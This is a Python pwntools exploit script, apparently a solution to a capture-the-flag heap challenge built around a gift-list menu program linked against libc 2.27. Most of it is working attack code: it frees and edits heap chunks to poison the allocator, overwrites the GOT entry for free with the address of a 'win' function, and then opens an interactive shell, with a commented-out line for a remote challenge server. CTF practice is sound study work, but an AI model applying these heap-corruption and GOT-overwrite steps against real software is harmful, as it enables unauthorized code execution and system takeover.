from pwn import *

elf = ELF('../file/main')
#libc = elf.libc

context.binary = elf
context.log_level = 'DEBUG'

p = elf.process()
#p = remote('nc.challs.htsp.ro', '8003')
libc = ELF('../file/libc-2.27.so')

def requestGift(index, name):
    p.recvuntil(b'Reject gift')
    p.sendline(b'1')
    p.recvuntil(b'index:')
    p.sendline(str(index).encode())
    p.recvuntil(b'gift:')
    p.sendline(name)

def viewGifts():
    p.recvuntil(b'Reject gift')
    p.sendline(b'2')

    out = []
    p.recvline()
    while True:
        line = p.recvline()
        if b'Request gift' in line:
            return out
        out.append(line.strip())

def editGifts(index, name):
    p.recvuntil(b'Reject gift')
    p.sendline(b'3')
    p.recvuntil(b'index:')
    p.sendline(str(index).encode())
    p.recvuntil(b'gift:')
    p.sendline(name)

def deleteGift(index):
    p.recvuntil(b'Reject gift')
    p.sendline(b'4')
    p.recvuntil(b'index:')
    p.sendline(str(index).encode())

win_addr = 0x0400C6A
gifts_addr = 0x0602160
got_free_addr = 0x602018
test_addr = 0xDEADBEEFDEADBEEF

requestGift(9, 'A' * 60)
requestGift(8, 'A' * 60)
requestGift(8, 'A' * 60)
requestGift(8, 'A' * 60)

time.sleep(1.1)
deleteGift(9)
deleteGift(8)

requestGift(0, 'A' * 60)
time.sleep(1)
editGifts(0, p64(got_free_addr) * 8)
time.sleep(0.2)
deleteGift(0)

time.sleep(1)
print(viewGifts())

# p.interactive()

requestGift(0, 'A' * 60)
time.sleep(1.1)

requestGift(0, 'B' * 60)

time.sleep(1)
viewGifts()

requestGift(0, p64(win_addr) * 6)

p.interactive()